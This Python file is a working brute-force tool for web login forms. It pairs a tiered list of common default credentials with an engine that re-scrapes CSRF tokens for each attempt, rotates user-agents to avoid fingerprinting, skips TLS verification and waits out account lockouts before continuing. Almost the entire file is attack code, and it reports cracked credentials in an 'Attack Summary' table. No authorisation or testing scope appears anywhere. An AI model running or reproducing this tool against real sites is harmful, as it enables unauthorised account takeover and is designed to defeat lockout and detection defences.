import requests
import time
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from rich.console import Console
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, SpinnerColumn
from rich.table import Table

try:
    from core.config import TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS
    from core.logger import logger
except ImportError:
    TARGET_TIMEOUT, SESSION_DELAY, MAX_BRUTE_ATTEMPTS = 10, 0.5, 500
    import logging
    logger = logging.getLogger(__name__)

console = Console()
ua = UserAgent()

# --- TIERED CREDENTIAL DATABASE ---
# Tier 1: Most common defaults (try first)
CREDENTIAL_DATABASE = [
    ("admin", "admin"),
    ("admin", "password123"),
    ("admin", "admin123"),
    ("admin", "123456"),
    ("admin", "12345678"),
    ("admin", "1234"),
    ("admin", "pass"),
    ("admin", "test"),
    ("admin", "root"),
    ("admin", "toor"),
    ("admin", "letmein"),
    ("admin", "qwerty"),
    ("admin", "abc123"),
    ("admin", "monkey"),
    ("admin", "dragon"),
    ("admin", "master"),
    ("admin", "sunshine"),
    ("admin", "welcome"),
    ("admin", "shadow"),
    # Tier 2: Common usernames with common passwords
    ("root", "root"),
    ("root", "toor"),
    ("root", "password"),
    ("root", "admin"),
    ("root", "123456"),
    ("user", "user"),
    ("user", "password"),
    ("admin", "password"),
    ("user", "123456"),
    ("test", "test"),
    ("test", "password"),
    ("test", "123456"),
    ("guest", "guest"),
    ("guest", "password"),
    ("demo", "demo"),
    ("demo", "password"),
    ("superadmin", "superadmin"),
    ("superadmin", "password"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("administrator", "admin"),
    # Tier 3: Extended common passwords for admin
    ("admin", "passw0rd"),
    ("admin", "p@ssword"),
    ("admin", "p@ss"),
    ("admin", "P@ssword1"),
    ("admin", "admin@123"),
    ("admin", "Admin123"),
    ("admin", "admin1"),
    ("admin", "admin2"),
    ("admin", "1234567890"),
    ("admin", "qwerty123"),
    ("admin", "iloveyou"),
    ("admin", "princess"),
    ("admin", "rockyou"),
    ("admin", "batman"),
    ("admin", "superman"),
    ("admin", "trustno1"),
    ("admin", "000000"),
    ("admin", "111111"),
    ("admin", "222222"),
    ("admin", "123123"),
    ("admin", "654321"),
    ("admin", "666666"),
    ("admin", "121212"),
    ("admin", "pass123"),
    ("admin", "pass1234"),
    ("admin", "secure"),
    ("admin", "secret"),
    ("admin", "changeme"),
    ("admin", "default"),
    ("admin", "blank"),
    ("admin", ""),
    # Tier 4: More usernames
    ("webadmin", "webadmin"),
    ("webadmin", "password"),
    ("sysadmin", "sysadmin"),
    ("sysadmin", "password"),
    ("manager", "manager"),
    ("manager", "password"),
    ("operator", "operator"),
    ("operator", "password"),
    ("support", "support"),
    ("support", "password"),
    ("service", "service"),
    ("service", "password"),
    ("info", "info"),
    ("info", "password"),
    ("mail", "mail"),
    ("mail", "password"),
    ("mysql", "mysql"),
    ("mysql", "password"),
    ("postgres", "postgres"),
    ("postgres", "password"),
    ("oracle", "oracle"),
    ("oracle", "password"),
    ("ftp", "ftp"),
    ("ftp", "password"),
    ("anonymous", "anonymous"),
    ("anonymous", ""),
]

# --- DETECTION SIGNALS ---
LOCKOUT_KEYWORDS = {"account locked", "too many attempts", "temporarily blocked", "rate limit"}
FAILURE_KEYWORDS = {"invalid", "incorrect", "failed", "error", "unsuccessful", "wrong"}

# Keywords that strongly indicate a successful login
SUCCESS_KEYWORDS = {"logout", "welcome", "dashboard", "profile", "sign out", "log out"}


class BruteForceEngine:
    def __init__(self, target_dict):
        self.target = target_dict
        self.session = requests.Session()
        self.session.headers["User-Agent"] = ua.random
        self.baseline = {}

    def _get_fresh_inputs(self):
        """
        Scrapes the login page for ALL input fields (CSRF tokens and buttons).
        Uses a fresh session GET so CSRF tokens are always valid.
        """
        try:
            resp = self.session.get(
                self.target["source_page"], timeout=TARGET_TIMEOUT, verify=False
            )
            soup = BeautifulSoup(resp.text, "lxml")
            inputs = {}
            for inp in soup.find_all("input"):
                name = inp.get("name")
                value = inp.get("value", "")
                if name:
                    inputs[name] = value
            return inputs
        except Exception as e:
            logger.error(f"Failed to fetch fresh tokens: {e}")
            return {}

    def _establish_baseline(self):
        """Sets the 'failure' signature by trying a known-bad login."""
        inputs = self._get_fresh_inputs()
        data = {
            self.target["username_field"]: "invalid_user_xauth",
            self.target["password_field"]: "invalid_pass_xauth",
            **inputs,
        }
        try:
            resp = self.session.post(
                self.target["action"], data=data, timeout=TARGET_TIMEOUT, verify=False
            )
            self.baseline = {
                "url": resp.url,
                "length": len(resp.text),
                "status": resp.status_code,
                "body_sample": resp.text.lower(),
            }
            console.print(
                f"[dim]  Baseline established: {resp.status_code} | {len(resp.text)} bytes[/dim]"
            )
        except Exception as e:
            logger.critical(f"Could not establish baseline: {e}")

    def _is_success(self, resp):
        """
        Multivariate success detection — multiple independent signals.

        Fix 1: Signal 3 (keyword disappearance) is now gated: it only fires
                if the baseline body DID contain a failure keyword. Previously
                it could fire on any page that happened to lack those words.

        Fix 2: Added positive SUCCESS_KEYWORDS signal (e.g. "logout" link
                appearing only after a real login).

        Fix 3: Response-length delta check — a significantly different page
                size compared to the baseline strongly suggests a new page.
        """
        body_lower = resp.text.lower()

        # Signal 1: URL changed away from the login page
        if resp.url != self.baseline.get("url", ""):
            if "login" not in resp.url.lower():
                return True

        # Signal 2: Redirect history to a non-login destination
        for r in resp.history:
            if r.status_code in (301, 302, 303):
                dest = r.headers.get("Location", "").lower()
                if dest and "login" not in dest:
                    return True

        # Signal 3: Positive success keywords appeared (logout link, welcome, etc.)
        if any(kw in body_lower for kw in SUCCESS_KEYWORDS):
            return True

        # Signal 4 (FIXED): Failure keywords disappeared — only meaningful if
        # the baseline page actually contained those keywords.
        baseline_had_failure = any(
            kw in self.baseline.get("body_sample", "") for kw in FAILURE_KEYWORDS
        )
        if baseline_had_failure and not any(kw in body_lower for kw in FAILURE_KEYWORDS):
            return True

        # Signal 5: Response body is substantially larger than the failure page
        # (logged-in pages usually have much more content).
        baseline_len = self.baseline.get("length", 0)
        if baseline_len and len(resp.text) > baseline_len * 1.5:
            return True

        return False

    def run(self, extra_creds=None):
        creds = (extra_creds or []) + CREDENTIAL_DATABASE
        # Deduplicate while preserving order
        seen = set()
        clean_creds = []
        for pair in creds:
            if pair not in seen:
                seen.add(pair)
                clean_creds.append(pair)
        clean_creds = clean_creds[:MAX_BRUTE_ATTEMPTS]

        self._establish_baseline()

        found = None
        attempts = 0

        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("{task.completed}/{task.total}"),
            TimeElapsedColumn(),
            console=console,
        ) as progress:
            task = progress.add_task("[cyan]Brute-forcing...", total=len(clean_creds))

            for user, pwd in clean_creds:
                attempts += 1

                # Rotate user-agent every 15 requests to reduce fingerprinting
                if attempts % 15 == 0:
                    self.session.headers["User-Agent"] = ua.random

                # 1. Fetch fresh CSRF token + all form fields
                form_data = self._get_fresh_inputs()
                form_data.update(
                    {
                        self.target["username_field"]: user,
                        self.target["password_field"]: pwd,
                    }
                )

                # 2. Submit login attempt
                try:
                    resp = self.session.post(
                        self.target["action"],
                        data=form_data,
                        timeout=TARGET_TIMEOUT,
                        verify=False,
                        allow_redirects=True,
                    )

                    # Check for account lockout
                    if any(kw in resp.text.lower() for kw in LOCKOUT_KEYWORDS):
                        console.print(
                            "\n[bold yellow]LOCKOUT DETECTED. Cooling down 30s...[/bold yellow]"
                        )
                        time.sleep(30)
                        continue

                    # 3. Evaluate success
                    if self._is_success(resp):
                        found = {
                            "username": user,
                            "password": pwd,
                            "attempt": attempts,
                            "url": resp.url,
                        }
                        break

                except Exception as e:
                    logger.warning(f"Request failed at attempt {attempts}: {e}")

                progress.advance(task)
                progress.update(task, description=f"[cyan]Trying [white]{user}[/white]")
                time.sleep(SESSION_DELAY + random.uniform(0, 0.2))

        self._print_summary(found, attempts)
        return found, attempts  # FIX: return attempts so caller can record it

    def _print_summary(self, found, attempts):
        table = Table(title="Attack Summary", border_style="bright_blue")
        table.add_column("Metric")
        table.add_column("Result")
        table.add_row("Total Attempts", str(attempts))
        if found:
            table.add_row("Status", "[bold red]SUCCESS[/bold red]")
            table.add_row("Credentials", f"{found['username']}:{found['password']}")
            table.add_row("Final URL", found["url"])
        else:
            table.add_row("Status", "[yellow]FAILED[/yellow]")
        console.print(table)


def brute_force(target, extra_credentials=None):
    engine = BruteForceEngine(target)
    result, attempts = engine.run(extra_creds=extra_credentials)  # FIX: unpack both values
    return {
        "target": target["action"],
        "found": result is not None,
        "credentials": result,
        "attempts": attempts,  # FIX: now correctly populated
    }